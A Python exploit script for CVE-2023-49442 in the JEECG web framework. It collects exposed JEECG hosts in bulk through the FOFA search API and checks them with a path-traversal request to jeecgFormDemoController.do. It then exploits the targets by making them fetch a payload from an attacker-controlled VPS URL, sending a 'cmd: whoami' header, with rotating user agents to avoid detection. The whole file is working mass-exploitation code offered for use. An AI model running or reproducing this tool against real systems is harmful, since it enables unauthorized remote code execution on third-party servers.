#!/usr/bin/env python
# -*- coding:utf-8 -*-

import urllib.parse
import urllib.request
import requests
import random
import json
import argparse

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = random_user_agent
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxxxx&key=xxxxxxxxxxx&qbase64=YXBwPSJKRUVDRyI%3D&size=9999" # app="JEECG"
        # 自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def poc_check(full_url):
    header = {'User-Agent':UA()}
    # 定义原始URL
    original_url = "/api/../jeecgFormDemoController.do"
    # URL编码处理
    encoded_url = urllib.parse.quote(original_url)
    # 构建完整的URL
    url = full_url + encoded_url + "?interfaceTest="
    if "https" not in url:
        try:
            print(url)
            req = urllib.request.Request(url, headers=header)
            with urllib.request.urlopen(req) as response:
                content = response.read().decode('utf-8')
                if response.getcode() == 200 and "msg" in content:
                    msg = "{} 可能存在漏洞".format(url)
                    # print(msg)
                    return True
                else:
                    msg = "{} 不存在漏洞".format(url)
                    # print(msg)
                    return False

        except Exception as e:
            msg = e
            # print("Error occurred:", str(e))
            return False, msg

def exp(full_url, vps):
    header = {
        'User-Agent': UA(),
        'cmd': 'whoami'
    }
    # 定义原始URL
    original_url = "/api/../jeecgFormDemoController.do"
    # URL编码处理
    encoded_url = urllib.parse.quote(original_url)
    # 构建完整的URL
    url = full_url + encoded_url + "?interfaceTest="

    try:
        # 构建POST请求的参数
        params = {
            'serverUrl': vps,
            'requestBody': '1',
            'requestMethod': 'GET'
        }

        # 将参数编码为bytes
        data = urllib.parse.urlencode(params).encode('utf-8')
        # 创建POST请求
        req = urllib.request.Request(url, data=data, headers=header, method='POST')
        # 发送请求并获取响应
        with urllib.request.urlopen(req) as response:
            content = response.read().decode('utf-8')
            if response.getcode() == 200 and "msg" in content:
                msg = "{} 可能存在漏洞".format(url)
                return True, msg
            else:
                msg = "{} 不存在漏洞".format(url)
                return False, msg
    except Exception as e:
        msg = "Error occurred:" + str(e)
        return False, msg

def main():
    parser = argparse.ArgumentParser(description="### JEECG jeecgFormDemoController Interface Code Execution Vulnerability(CVE-2023-49442) ###")
    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-c", "--check", metavar="FILE", help="Perform check testing. e.g:python CVE-2023-49442.py -c ./url.txt")
    parser.add_argument("-r", "--exp", nargs=2, metavar=("FILE", "URL"), help="Vulnerability exploitation. e.g:python CVE-2023-49442.py -r ./maybe_url.txt http://VPS/jeecg.txt")
    parser.add_argument("-u", "--url", nargs=2, metavar=("URL", "URL"), help="Vulnerability exploitation. e.g:python CVE-2023-49442.py -r http://target http://VPS/jeecg.txt")

    args = parser.parse_args()

    if args.target_collection: # -t 收集资产
        Target_collection("./url.txt")
        print("基于fofa收集到的资产保存在当前目录下的url.txt中.")

    elif args.check:    # -c 对收集到的资产进行漏洞探测
        with open(args.check, 'r') as f:
            for lines in f:
                url = lines.strip()
                flag = poc_check(url)
                # print(url + " " + str(flag))
                if flag:
                    with open('./maybe_url.txt', 'a') as f:
                        f.write("{}\n".format(str(url)))
        print("基于收集到的资产，可能存在漏洞的目标保存在当前目录下的maybe_url.txt中。")

    elif args.exp:  # -r 对可能存在漏洞的资产进行漏洞利用尝试
        file_path, vps = args.exp
        with open(file_path, "r") as f:
            for lines in f:
                url = lines.strip()
                flag, msg = exp(url, vps)
                print(msg)

    elif args.url:
        url, vps = args.url
        flag, msg = exp(url, vps)
        print(msg)

    else:
        print("No valid options provided. Use -h for help.")

if __name__ == '__main__':
    main()
